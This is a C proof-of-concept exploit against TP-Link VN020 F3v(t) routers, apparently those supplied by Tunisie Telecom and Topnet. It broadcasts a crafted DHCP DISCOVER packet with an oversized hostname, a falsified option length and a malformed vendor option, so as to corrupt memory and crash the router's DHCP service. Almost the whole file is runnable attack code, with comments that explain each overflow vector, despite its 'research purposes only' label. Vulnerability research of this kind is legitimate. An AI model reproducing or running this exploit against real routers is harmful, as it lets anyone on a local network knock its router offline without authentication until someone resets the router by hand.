
/*
 * TP-Link Router VN020 FVT DHCP Memory Corruption POC
 * ===================================================
 * Author: Mohamed Maatallah (Alias: Zeph)
 * Target: TP-Link Router Firmware TT_V6.2.1021
 * Type: DHCP Memory Corruption via Malformed Options
 *
 * Technical Details:
 * -----------------
 * - Triggers multiple memory corruption vectors in DHCP parsing
 * - Primary vector: Stack overflow via oversized hostname (127 bytes)
 * - Secondary vector: Parser confusion via malformed length fields
 * - Tertiary vector: Vendor specific option parsing edge case
 *
 * Attack Surface:
 * --------------
 * - DHCP service running on port 67
 * - Processes broadcast DISCOVER packets
 * - No authentication required
 * - Affects all routers running VN020 F3v(t) specifically the ones
 *   supplied by Tunisie Telecom & Topnet
 *
 * Exploitation Method:
 * ------------------
 * 1. Sends crafted DHCP DISCOVER packet
 * 2. Overflows hostname buffer (64 -> 127 bytes)
 * 3. Corrupts length fields in DHCP options
 * 4. Success = No response (service crash)
 *
 * Build:
 * ------
 * Windows: cl poc.c /o tplink_dhcp.exe or use visual studio directly.
 *
 * Usage:
 * ------
 * tplink_dhcp.exe
 *
 * Notes:
 * ------
 * - POC triggers DOS condition
 * - Success indicated by router not responding
 * - May require multiple attempts
 * - Router requires hard reset after successful crash
 *
 * THIS IS A PROOF OF CONCEPT FOR RESEARCH PURPOSES ONLY
 * ===================================================
 */


 // Disable deprecation warnings for older Winsock functions
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <Ws2tcpip.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <winsock2.h>

#pragma comment(lib, "ws2_32.lib")

// Standard DHCP ports - Server listens on 67, clients send from 68
#define DHCP_SERVER_PORT 67
#define DHCP_CLIENT_PORT 68
#define MAX_PACKET_SIZE 1024  // Maximum size for DHCP packet
#define MAX_ATTEMPTS 3       

// Forward declarations of functions
void create_dhcp_discover_packet(unsigned char* packet, int* packet_length);
void add_option(unsigned char* packet, int* offset, unsigned char option,
    unsigned char length, unsigned char* data);
void tp_link(unsigned char* packet, int* offset);
void print_packet_hex(unsigned char* packet, int length);
int wait_for_response(SOCKET sock, int timeout);

int main() {
    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in dest;
    unsigned char packet[MAX_PACKET_SIZE];  // Buffer for DHCP packet
    int packet_length = 0;                  // Length of constructed packet
    int attempts = 0;                       // Counter for send attempts
    int success = 0;


    printf("[TP-Thumper] Initializing Winsock...\n");
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        printf("[TP-Thumper] Winsock initialization failed. Error: %d\n",
            WSAGetLastError());
        return 1;
    }

    sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock == INVALID_SOCKET) {
        printf("[TP-Thumper] Could not create socket. Error: %d\n",
            WSAGetLastError());
        WSACleanup();
        return 1;
    }

    // Set up broadcast address (255.255.255.255)
    dest.sin_family = AF_INET;
    dest.sin_port = htons(DHCP_SERVER_PORT);
    dest.sin_addr.s_addr = inet_addr("255.255.255.255");

    // Enable broadcast mode on socket
    BOOL broadcast = TRUE;
    if (setsockopt(sock, SOL_SOCKET, SO_BROADCAST, (char*)&broadcast,
        sizeof(broadcast)) < 0) {
        printf("[TP-Thumper] Broadcast mode failed.\n");
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    srand((unsigned int)time(NULL));

    // Create the DHCP DISCOVER packet
    create_dhcp_discover_packet(packet, &packet_length);

    // Main attempt loop - tries to send packet MAX_ATTEMPTS times
    while (attempts < MAX_ATTEMPTS && !success) {
        printf("[TP-Thumper] Sending DHCP Discover packet (Attempt %d/%d)...\n",
            attempts + 1, MAX_ATTEMPTS);
        print_packet_hex(packet, packet_length);  //debug

        // Send the packet
        if (sendto(sock, (char*)packet, packet_length, 0, (struct sockaddr*)&dest,
            sizeof(dest)) < 0) {
            printf("[TP-Thumper] Packet send failed. Error: %d\n", WSAGetLastError());
        }
        else {
            printf("[TP-Thumper] Packet sent. Waiting for router response...\n");
            if (wait_for_response(sock, 10)) {
                printf(
                    "[TP-Thumper] Router responded! Exploit may not have succeeded.\n");
                success = 1;
            }
            else {
                printf("[TP-Thumper] No response received within timeout.\n");
            }
        }
        attempts++;
    }
    if (!success) {
        printf(
            "[TP-Thumper] Exploit succeeded: No router response after %d "
            "attempts.\n",
            MAX_ATTEMPTS);
    }
    else {
        printf("[TP-Thumper] Exploit failed: Router responded within timeout.\n");
    }

    // Cleanup
    closesocket(sock);
    WSACleanup();
    return 0;
}
/*
 * DHCP Message Format:
 * [0x00]: op      = 0x01        ; BOOTREQUEST
 * [0x01]: htype   = 0x01        ; Ethernet
 * [0x02]: hlen    = 0x06        ; MAC addr len
 * [0x03]: hops    = 0x00        ; No relay
 * [0x04-0x07]: xid             ; Random transaction ID
 * [0x08-0x0F]: secs + flags    ; Broadcast flags set
 * [0x10-0x1F]: ciaddr + yiaddr ; Empty
 * [0x20-0x27]: siaddr + giaddr ; Empty
 * [0x28-0x2D]: chaddr         ; Crafted MAC
 */

void create_dhcp_discover_packet(unsigned char* packet, int* packet_length) {
    memset(packet, 0, MAX_PACKET_SIZE);
    int offset = 0;

    // DHCP Header - Standard fields
    packet[offset++] = 0x01;  // BOOTREQUEST
    packet[offset++] = 0x01;  // Ethernet
    packet[offset++] = 0x06;  // MAC len
    packet[offset++] = 0x00;  // No hops

    // ; XID - rand() used for bypass of response filtering
    // ; mov eax, rand()
    // ; mov [packet + 4], eax
    unsigned int xid = (unsigned int)rand();
    *((unsigned int*)&packet[offset]) = htonl(xid);
    offset += 4;

    // ; Flags - Set broadcast bit to force response
    // ; mov word [packet + 8], 0x0000  ; secs elapsed
    // ; mov word [packet + 10], 0x8000  ; broadcast flag
    packet[offset++] = 0x00;
    packet[offset++] = 0x00;
    packet[offset++] = 0x80;
    packet[offset++] = 0x00;

    // Zero IP fields - forces DHCP server parse
    memset(&packet[offset], 0, 16);
    offset += 16;

    // ; Crafted MAC - DE:AD:BE:EF:00:01
    // ; Used for unique client tracking, bypasses MAC filters
    packet[offset++] = 0xDE;
    packet[offset++] = 0xAD;
    packet[offset++] = 0xBE;
    packet[offset++] = 0xEF;
    packet[offset++] = 0x00;
    packet[offset++] = 0x01;
    memset(&packet[offset], 0x00, 10);
    offset += 10;

    // ; Skip server name/boot filename
    // ; Total padding: 192 bytes
    memset(&packet[offset], 0x00, 64);
    offset += 64;
    memset(&packet[offset], 0x00, 128);
    offset += 128;

    // ; DHCP Magic Cookie
    // ; 0x63825363 = DHCP in natural order
    packet[offset++] = 0x63;
    packet[offset++] = 0x82;
    packet[offset++] = 0x53;
    packet[offset++] = 0x63;

    // ; Stack layout after this point:
    // ; [ebp+0] = DHCP header
    // ; [ebp+240] = DHCP options start
    // ; Router parses sequentially from this point
    add_option(packet, &offset, 0x35, 0x01, (unsigned char[]) { 0x01 });
    add_option(packet, &offset, 0x37, 4,
        (unsigned char[]) {
        0x01, 0x03, 0x06, 0x0F
    });

    // ; Trigger overflow conditions
    tp_link(packet, &offset);

    packet[offset++] = 0xFF;  // End option
    *packet_length = offset;
}

void tp_link(unsigned char* packet, int* offset) {
    // ; Vendor specific overflow - triggers parser state confusion
    // ; 0x00,0x14,0x22 = TP-Link vendor prefix
    // ; Following 0xFF bytes cause length validation bypass
    unsigned char vendor_specific[] = { 0x00, 0x14, 0x22, 0xFF, 0xFF, 0xFF };
    add_option(packet, offset, 0x2B, sizeof(vendor_specific), vendor_specific);

    // ; Stack buffer overflow via hostname
    // ; Router allocates 64-byte buffer but we send 127
    // ; Overwrites adjacent stack frame
    unsigned char long_hostname[128];
    memset(long_hostname, 'A', sizeof(long_hostname) - 1);
    long_hostname[127] = '\0';
    add_option(packet, offset, 0x0C, 127, long_hostname);

    // ; Length field exploit
    // ; Claims 255 bytes but only sends 1
    // ; Router assumes full length during memory operations
    // ; leads to read/write past buffer
    add_option(packet, offset, 0x3D, 0xFF, (unsigned char[]) { 0x01 });
}

// ; Helper for DHCP option construction
// ; option = option code
// ; length = claimed length (can be falsified)
// ; data = actual payload

void add_option(unsigned char* packet, int* offset, unsigned char option,
    unsigned char length, unsigned char* data) {
    packet[(*offset)++] = option;  // Option type
    packet[(*offset)++] = length;  // Claimed length
    memcpy(&packet[*offset], data, length);
    *offset += length;
}

// Debug 
void print_packet_hex(unsigned char* packet, int length) {
    printf("[TP-Thumper] Packet Hex Dump:\n");

    // Print header fields with labels
    printf("Opcode (op): %02X\n", packet[0]);
    printf("Hardware Type (htype): %02X\n", packet[1]);
    printf("Hardware Address Length (hlen): %02X\n", packet[2]);
    printf("Hops: %02X\n", packet[3]);

    // Transaction ID
    printf("Transaction ID (xid): ");
    for (int i = 4; i < 8; i++) {
        printf("%02X ", packet[i]);
    }
    printf("\n");

    // Flags
    printf("Flags: ");
    for (int i = 10; i < 12; i++) {
        printf("%02X ", packet[i]);
    }
    printf("\n");

    // Client Hardware Address (MAC)
    printf("Client Hardware Address (chaddr): ");
    for (int i = 28; i < 34; i++) {
        printf("%02X ", packet[i]);
    }
    printf("\n");

    // DHCP Magic Cookie
    printf("Magic Cookie: ");
    for (int i = 236; i < 240; i++) {
        printf("%02X ", packet[i]);
    }
    printf("\n");

    // DHCP Options
    printf("DHCP Options:\n");
    int i = 240;
    while (i < length) {
        printf("  Option: %02X, Length: %02X, Data: ", packet[i], packet[i + 1]);
        int option_length = packet[i + 1];
        for (int j = 0; j < option_length; j++) {
            printf("%02X ", packet[i + 2 + j]);
        }
        printf("\n");
        i += 2 + option_length;
        if (packet[i] == 0xFF) {
            printf("  End of Options\n");
            break;
        }
    }
}

// Wait for router response with timeout
int wait_for_response(SOCKET sock, int timeout) {
    struct timeval tv;
    tv.tv_sec = timeout;
    tv.tv_usec = 0;

    // Set up file descriptor set for select()
    fd_set readfds;
    FD_ZERO(&readfds);
    FD_SET(sock, &readfds);

    // Wait for data or timeout
    int result = select(0, &readfds, NULL, NULL, &tv);
    return result > 0;  // Returns true if data available
}